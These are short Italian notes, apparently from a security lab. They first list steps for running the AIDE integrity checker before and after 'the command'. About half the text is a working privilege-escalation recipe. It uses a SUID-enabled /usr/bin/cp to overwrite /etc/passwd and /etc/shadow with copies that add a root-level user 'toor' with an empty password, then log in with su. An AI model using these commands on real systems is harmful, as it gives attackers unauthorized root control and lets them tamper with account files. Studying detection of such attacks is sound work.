1) inizializzare aide: aideinit

2) copiare il database: sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

3) eseguire una scansione prima di lanciare il comando: sudo aide --config=/etc/aide/aide.conf --check

4) esegui il comando

5) eseguire di nuovo scansione sudo aide --config=/etc/aide/aide.conf --check

PRIVILEGE ESCALATION CON /USR/BIN/CP:
Per ottenere privilegi usando /usr/bin/cp, se ha il bit SUID settato, copiare /etc/passwd e shadow nella home usando cat /etc/passwd > file, poi aggiungici le righe sotto
passwd: toor:x:0:0:root:/root:/bin/bash
shadow: toor::19418:0:99999:7:::

poi esegui
/usr/bin/cp /home/kali/passwd /etc/passwd
/usr/bin/cp /home/kali/shadow /etc/shadow


per diventare toor: su toor 